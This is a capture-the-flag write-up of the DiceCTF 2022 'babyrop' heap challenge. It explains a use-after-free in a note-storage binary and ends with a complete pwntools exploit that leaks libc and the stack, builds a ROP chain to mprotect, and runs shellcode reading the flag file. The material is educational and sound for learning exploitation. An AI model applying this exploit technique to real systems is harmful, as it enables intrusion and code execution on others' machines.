---
layout: post
title: Babyrop DiceCTF2022 Writeup
subtitle: Writeup for babyrop challenge
tags: [pwn, heap, writeup]
---

> this ROP tastes kinda funny...
>
> `nc mc.ax 31245`
>
> [Challenge](https://github.com/th3-5had0w/CTF-contests/tree/master/DiceCTF2022/babyrop)

- Content:
    - [Reversing](#reversing)
    - [Vulnerability](#vulnerability)
    - [Exploit](#exploit)
    - [Ending](#ending)

### Note:

The challenge uses libc 2.34, which means:

* No more `__malloc_hook` or `__free_hook`

* Heap pointer is [encrypted](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/)

# Reversing

Challenge gives us the source code of binary:

```C
#include <stdio.h>
#include <stdlib.h>

#include <unistd.h>
#include "seccomp-bpf.h"

void activate_seccomp()
{
    struct sock_filter filter[] = {
        VALIDATE_ARCHITECTURE,
        EXAMINE_SYSCALL,
        ALLOW_SYSCALL(mprotect),
        ALLOW_SYSCALL(mmap),
        ALLOW_SYSCALL(munmap),
        ALLOW_SYSCALL(exit_group),
        ALLOW_SYSCALL(read),
        ALLOW_SYSCALL(write),
        ALLOW_SYSCALL(open),
        ALLOW_SYSCALL(close),
        ALLOW_SYSCALL(openat),
        ALLOW_SYSCALL(fstat),
        ALLOW_SYSCALL(brk),
        ALLOW_SYSCALL(newfstatat),
        ALLOW_SYSCALL(ioctl),
        ALLOW_SYSCALL(lseek),
        KILL_PROCESS,
    };

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(struct sock_filter)),
        .filter = filter,
    };

    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}

...

typedef struct {
    size_t length;
	char * string;
} safe_string;

safe_string * data_storage[NUM_STRINGS];

...

int main() {

    get_libc();
    activate_seccomp();

    int idx;
    int c;
    
    while(1){
        fprintf(stdout, "enter your command: ");
        fflush(stdout);
        while((c = getchar()) == '\n' || c == '\r');

        if(c == EOF) { return 0; }

        fprintf(stdout, "enter your index: ");
        fflush(stdout);
        scanf("%u", &idx);

        if((idx < 0) || (idx >= NUM_STRINGS)) {
            fprintf(stdout, "index out of range: %d\n", idx);
            fflush(stdout);
            continue;
        }

        switch(c) {
            case 'C':
                create_safe_string(idx);
                break;
            case 'F':
                free_safe_string(idx);
                break;
            case 'R':
                read_safe_string(idx);
                break;
            case 'W':
                write_safe_string(idx);
                break;
            case 'E':
                return 0;
        }
    
    }
}
```

Take a brief look at it and we can see we have 10 indexes to put the notes in, and this challenge have seccomp which only allows us to use some specific syscall, other than that the program will abort executing. Also, this is a classical heapnote challenge with 4 functions to interact with the notes:
* create_safe_string:

```C
void create_safe_string(int i) {

    safe_string * ptr = malloc(sizeof(safe_string));

    fprintf(stdout, "How long is your safe_string: ");
    fflush(stdout);
    scanf("%zu", &ptr->length);

    ptr->string = malloc(ptr->length);
    data_storage[i] = ptr;

    write_safe_string(i);

}
```

This allows you to create a string with arbitrary size at specified index and then write into it.
* free_safe_string:

```C
void free_safe_string(int i) {
    safe_string * ptr = data_storage[i];
    free(ptr->string);
    free(ptr);
}
```

Basically just a free function, we could use it to delete a string at specified index.
* read_safe_string:

```C
void read_safe_string(int i) {
    safe_string * ptr = data_storage[i];
    if(ptr == NULL) {
        fprintf(stdout, "that item does not exist\n");
        fflush(stdout);
        return;
    }

    fprintf(stdout, "Sending %zu hex-encoded bytes\n", ptr->length);
    for(size_t j = 0; j < ptr->length; ++j) {
        fprintf(stdout, " %02x", (unsigned char) ptr->string[j]);
    }
    fprintf(stdout, "\n");
    fflush(stdout);
}
```

This function is to read data from the notes that we created. You can see this as a "leak" function.
* write_safe_string:

```C
void write_safe_string(int i) {
    safe_string * ptr = data_storage[i];
    if(ptr == NULL) {
        fprintf(stdout, "that item does not exist\n");
        fflush(stdout);
        return;
    }

    fprintf(stdout, "enter your string: ");
    fflush(stdout);

    read(STDIN_FILENO, ptr->string, ptr->length);
}
```

This function allows us to write into those notes that we created. See this as an "edit" function.



# Vulnerability

The vulnerbilities are pretty obvious. Use-after-free at the free_safe_string function, but how do we leverage this into an arbitrary write primitive?

Let me explain. If you had noticed, you'll realize a note struct contains a size variable and a pointer to the note content:
```C
typedef struct {
    size_t length;
	char * string;
} safe_string;
```

The thing is, when you input an very big size number such as -1 (size_t is unsigned type) then the malloc will fail and return no malloc pointer. Let me show it:

This is a normal usage of the note:

enter your command: C

enter your index: 0

How long is your safe_string: 24

enter your string: I'm th3_5had0w

In heap zone the chunk looks like this:

<span class="color-green">0x405ab0</span>:	0x0000000000000000	0x0000000000000021

<span class="color-green">0x405ac0</span>:	0x0000000000000018	0x0000000000405ae0

<span class="color-green">0x405ad0</span>:	0x0000000000000000	0x0000000000000021

<span class="color-green">0x405ae0</span>:	0x5f336874206d2749	0x000a773064616835

The chunk at 0x405ab0 is the note struct.

safe_string->length = 0x18

safe_string->string = 0x405ae0

Everything's fine.


Now let's take a look at the malicious one:

enter your command: C

enter your index: 0

How long is your safe_string: -1

enter your string: enter your command:

Well, apperently, there are no pointer to be read to and expectedly, the read function failed =))

Heap zone:

<span class="color-green">0x405ab0</span>:	0x0000000000000000	0x0000000000000021

<span class="color-green">0x405ac0</span>:	0xffffffffffffffff	0x0000000000000000

<span class="color-green">0x405ad0</span>:	0x0000000000000000	0x0000000000020531

<span class="color-green">0x405ae0</span>:	0x0000000000000000	0x0000000000000000

Right here, because the memory allocation for the string failed. We only have one struct allocated. Now let's think. How could this be a serious problem? 🧠

![](https://jonatanhal.github.io/assets/post_images/protostar_heap3_wat.jpg)

Hmm... well, my plan might help you see the vulnerability clearer.

1. Create note0 with size 0x21.

2. Free note0, now we have 2 chunks with size 0x21.

3. Create note1 and note2 continuously, and then free them.

4. Create note4 with size 0x21.

Can you see that now.

<span class="color-green">0x405ab0</span>:  0x0000000000000000	0x0000000000000021 

<span class="color-green">0x405ac0</span>:  0x0000000000000018	0x0000000000405ae0 <--note1 ptr: 0x405ac0

<span class="color-green">0x405ad0</span>:  0x0000000000000000	0x0000000000000021

<span class="color-green">0x405ae0</span>:  0x4141414141414141  0x4242424242424242 <--note2 ptr: 0x405ae0

If you choose to read from or write to note2, it will perform the specified action with length 0x4141414141414141 at pointer 0x4242424242424242. 🙀

Because now the struct is corrupted. note1's content pointer is pointing to note2's struct, we can change the content of note2 by writing using note1. This means we have and arbitrary read and arbitrary write primitive.



# Exploit

Since this is glibc 2.34, we don't have __malloc_hook nor we could hijack heap pointer. We will move the attack to stack.

1. Leak libc, leak stack and calculate offset from environ to the return pointer of main function (it's 0x140).

2. Use mprotect to set RWX flag for stack.

3. Combined ROPchain and shellcode to make an Open-Read-Write exploit to the flag.

code:
```python
from pwn import *

BEDUG = False

libc = ELF('./libc.so.6')
elf = ELF('./babyrop')
if BEDUG==True:
    io = process('./babyrop', env={"LD_PRELOAD": "./libc.so.6"})
else:
    io = remote('mc.ax', 31245)

def C(index, size, data):
    io.recvuntil(b'enter your command: ')
    io.sendline(b'C')
    io.recvuntil(b'enter your index: ')
    io.sendline(str(index).encode('utf-8'))
    io.recvuntil(b'How long is your safe_string: ')
    io.sendline(str(size).encode('utf-8'))
    io.recvuntil(b'enter your string: ')
    io.send(data)

def F(index):
    io.recvuntil(b'enter your command: ')
    io.sendline(b'F')
    io.recvuntil(b'enter your index: ')
    io.sendline(str(index).encode('utf-8'))

def R(index):
    io.recvuntil(b'enter your command: ')
    io.sendline(b'R')
    io.recvuntil(b'enter your index: ')
    io.sendline(str(index).encode('utf-8'))


def W(index, dat):
    io.recvuntil(b'enter your command: ')
    io.sendline(b'W')
    io.recvuntil(b'enter your index: ')
    io.sendline(str(index).encode('utf-8'))
    io.recvuntil(b'enter your string: ')
    io.send(dat)

C(0, 24, b'A')
F(0)
C(1, -1, b'')
C(2, -1, b'')
F(2)
F(1)
C(0, 24, p64(8)+p64(elf.got['puts']))
R(2)
io.recvuntil(b'hex-encoded bytes\n')
a = io.recvline().split()[::-1]
tmp = b''
for i in a:
    tmp += i

libc.address = int(tmp, 16) - libc.sym['puts']
log.info('libc: '+hex(libc.address))
W(0, p64(8)+p64(libc.sym['environ']))
R(2)
io.recvuntil(b'hex-encoded bytes\n')
a = io.recvline().split()[::-1]
tmp = b''
for i in a:
    tmp += i

retaddr = int(tmp, 16) - 0x140
log.info('stack: '+hex(retaddr))
basestack = (retaddr + 0x1be8) - ((retaddr + 0x1be8) % 0x1000) - 0x21000
log.info('base stack: '+hex(basestack))

W(0, p64(0x300)+p64(retaddr))
rop =  p64(libc.address + 0x000000000002d7dd) # pop rdi ; ret
rop += p64(basestack)
rop += p64(libc.address + 0x000000000002eef9) # pop rsi ; ret
rop += p64(0x21000)
rop += p64(libc.address + 0x00000000000d9c2d) # pop rdx ; ret
rop += p64(7)
rop += p64(libc.address + 0x00000000000448a8) # pop rax ; ret
rop += p64(10)
rop += p64(libc.address + 0x00000000000888f2) # syscall ; ret
rop += p64(libc.address + 0x000000000002d7dd) # pop rdi ; ret
rop += p64(retaddr+0x99+0x25)
rop += p64(libc.address + 0x000000000002eef9) # pop rsi ; ret
rop += p64(0)
rop += p64(libc.address + 0x00000000000d9c2d) # pop rdx ; ret
rop += p64(0)
rop += p64(libc.sym['open'])

rop += p64(libc.address + 0x00000000000448a8) # pop rax ; ret
rop += p64(retaddr+0x99)
rop += p64(libc.address + 0x0000000000119227) # mov rsi, rdx ; call rax
rop += b'\x48\x31\xFF\x48\xFF\xC7\x48\xFF\xC7\x48\xFF\xC7\x48\x31\xC0\x48\x8D\x74\x24\x30\x48\x31\xD2\xB2\x60\x0F\x05\x48\x31\xFF\x48\xFF\xC7\x48\x89\xF8\x0F\x05'
rop += b'flag.txt'
rop += p64(0)
W(2, rop)
io.interactive() # input E command with size 0 to trigger the exploit :D
```

Flag: `dice{glibc_2.34_stole_my_function_pointers-but_at_least_nobody_uses_intel_CET}`



# Ending

This challenge is not very hard or anything like that but I think this challenge is worth writing about because for me it's fun, and might be useful for later, like some new pwner trying to learn heap pwning. Cheers haha. 🥂